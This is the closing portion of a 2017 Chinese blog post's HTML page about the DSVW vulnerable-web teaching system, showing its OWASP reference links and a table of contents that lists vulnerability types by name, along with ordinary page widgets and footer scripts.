+<h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5 参考链接"></a>5 参考链接</h2><ul>
+<li><a href="https://github.com/stamparm/DSVW" target="_blank" rel="external">https://github.com/stamparm/DSVW</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29</a></li>
+<li><a href="https://www.owasp.org/index.php/XPATH_Injection" target="_blank" rel="external">https://www.owasp.org/index.php/XPATH_Injection</a></li>
+<li><a href="http://www.w3school.com.cn/xpath/" target="_blank" rel="external">http://www.w3school.com.cn/xpath/</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29</a></li>
+<li><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="external">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></li>
+<li><a href="https://sobug.com/article/detail/11" target="_blank" rel="external">https://sobug.com/article/detail/11</a></li>
+<li><a href="https://www.owasp.org/index.php/Content_Spoofing" target="_blank" rel="external">https://www.owasp.org/index.php/Content_Spoofing</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Clickjacking_%28OTG-CLIENT-009%29" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_Clickjacking_%28OTG-CLIENT-009%29</a></li>
+<li><a href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" target="_blank" rel="external">https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet</a></li>
+<li><a href="https://www.owasp.org/index.php/Full_Path_Disclosure" target="_blank" rel="external">https://www.owasp.org/index.php/Full_Path_Disclosure</a></li>
+<li><a href="https://www.imperva.com/resources/glossary?term=source_code_disclosure" target="_blank" rel="external">https://www.imperva.com/resources/glossary?term=source_code_disclosure</a></li>
+<li><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="external">https://www.owasp.org/index.php/Path_Traversal</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion" target="_blank" rel="external">https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion</a></li>
+<li><a href="https://www.owasp.org/index.php/HTTP_Response_Splitting" target="_blank" rel="external">https://www.owasp.org/index.php/HTTP_Response_Splitting</a></li>
+<li><a href="http://www.moqifei.com/archives/609" target="_blank" rel="external">http://www.moqifei.com/archives/609</a></li>
+<li><a href="https://www.owasp.org/index.php/Denial_of_Service" target="_blank" rel="external">https://www.owasp.org/index.php/Denial_of_Service</a></li>
+</ul>
+
+            </article>
+            
+                <div class="share">
+                    <!--开启分享-->
+<div class="share-component" data-disabled="google,twitter,facebook" data-description="Damn Small Vulnerable Web (..."></div>
+
+<script src="/js/share.min.js"></script>
+
+                </div>    
+            
+            
+                
+<div class="comments">
+	<div class="ds-thread" data-thread-key="一款轻量级Web漏洞教学演示系统-DSVW" data-title="一款轻量级Web漏洞教学演示系统(DSVW)" data-url="http://mykings.me/2017/02/04/一款轻量级Web漏洞教学演示系统-DSVW/"></div>
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"mykings"};
+		(function() {
+			var ds = document.createElement('script');
+			ds.type = 'text/javascript';ds.async = true;
+			ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+			ds.charset = 'UTF-8';
+			(document.getElementsByTagName('head')[0]
+			 || document.getElementsByTagName('body')[0]).appendChild(ds);
+		})();
+	</script>
+</div>
+
+            
+        </div>
+        <div class="column one-fourth">
+            
+                
+                
+
+
+<h3>Post Directory</h3>
+
+<div id="post-directory-module">
+	<section class="post-directory">
+		<p><strong class="toc-title">文章目录</strong></p>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-依赖环境"><span class="toc-text">1 依赖环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-安装使用"><span class="toc-text">2 安装使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-基础背景"><span class="toc-text">3. 基础背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-数据库"><span class="toc-text">3.1 数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-XML配置"><span class="toc-text">3.2 XML配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-漏洞类型"><span class="toc-text">4 漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-注入漏洞"><span class="toc-text">4.1 注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-1-Blind-SQL-Injection-boolean"><span class="toc-text">4.1.1 Blind SQL Injection (boolean)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-2-Blind-SQL-Injection-time"><span class="toc-text">4.1.2 Blind SQL Injection (time)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-3-UNION-SQL-Injection"><span class="toc-text">4.1.3 UNION SQL Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-4-Login-Bypass"><span class="toc-text">4.1.4 Login Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-5-XML-External-Entity-local"><span class="toc-text">4.1.5 XML External Entity (local)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-6-XML-External-Entity-remote"><span class="toc-text">4.1.6 XML External Entity (remote)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-7-Blind-XPath-Injection-boolean"><span class="toc-text">4.1.7 Blind XPath Injection (boolean)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-跨站漏洞"><span class="toc-text">4.2 跨站漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-1-Cross-Site-Scripting-reflected"><span class="toc-text">4.2.1 Cross Site Scripting (reflected)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-Cross-Site-Scripting-stored"><span class="toc-text">4.2.2 Cross Site Scripting (stored)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-3-Cross-Site-Scripting-DOM"><span class="toc-text">4.2.3 Cross Site Scripting (DOM)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-4-Cross-Site-Scripting-JSONP"><span class="toc-text">4.2.4 Cross Site Scripting (JSONP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-5-Cross-Site-Request-Forgery"><span class="toc-text">4.2.5 Cross Site Request Forgery</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-其他漏洞"><span class="toc-text">4.3 其他漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-1-HTTP-Parameter-Pollution"><span class="toc-text">4.3.1 HTTP Parameter Pollution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-2-Server-Side-Request-Forgery"><span class="toc-text">4.3.2 Server Side Request Forgery</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-3-Frame-Injection-phishing"><span class="toc-text">4.3.3 Frame Injection (phishing)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-4-Frame-Injection-content-spoofing"><span class="toc-text">4.3.4 Frame Injection (content spoofing)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-5-Clickjacking"><span class="toc-text">4.3.5 Clickjacking</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-6-Unvalidated-Redirect"><span class="toc-text">4.3.6 Unvalidated Redirect</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-7-Arbitrary-Code-Execution"><span class="toc-text">4.3.7 Arbitrary Code Execution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-8-Full-Path-Disclosure"><span class="toc-text">4.3.8 Full Path Disclosure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-9-Source-Code-Disclosure"><span class="toc-text">4.3.9 Source Code Disclosure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-10-Path-Traversal"><span class="toc-text">4.3.10 Path Traversal</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-11-File-Inclusion-remote"><span class="toc-text">4.3.11 File Inclusion (remote)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-12-HTTP-Header-Injection-phishing"><span class="toc-text">4.3.12 HTTP Header Injection (phishing)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-13-Component-with-Known-Vulnerability-pickle"><span class="toc-text">4.3.13 Component with Known Vulnerability (pickle)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-14-Denial-of-Service-memory"><span class="toc-text">4.3.14 Denial of Service (memory)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-参考链接"><span class="toc-text">5 参考链接</span></a></li></ol>
+	</section>
+</div>
+            
+        </div>
+    </div>
+</section>
+
+<footer class="container">
+    <div class="site-footer" role="contentinfo">
+        <div class="copyright left mobile-block">
+           © 2017 <span title="MyKings">MyKings</span>
+            <a href="javascript:window.scrollTo(0,0)" class="right mobile-visible">TOP</a>
+        </div>
+        <ul class="site-footer-links right mobile-hidden">
+            <li><a href="javascript:window.scrollTo(0,0)" >TOP</a></li>
+        </ul>
+        <a href="https://github.com/yumemor/hexo-theme-primer" target="_blank" aria-label="view source code">
+            <span class="mega-octicon octicon-mark-github" title="GitHub"></span>
+        </a>
+        <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1261057886'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1261057886%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+    </div>
+</footer>
+
+		<script src="/js/geopattern.js"></script>
+		
+		<script src="/js/toc.js"></script>
+		
+		<script src="/js/highlight.pack.js"></script>
+		<script src="/lib/fancybox/jquery.fancybox-1.3.4.pack.js"></script>
+		<script src="/js/index.js"></script>
+		 <script src="/js/popular_repo.js"></script> 
+	</body>
+</html>
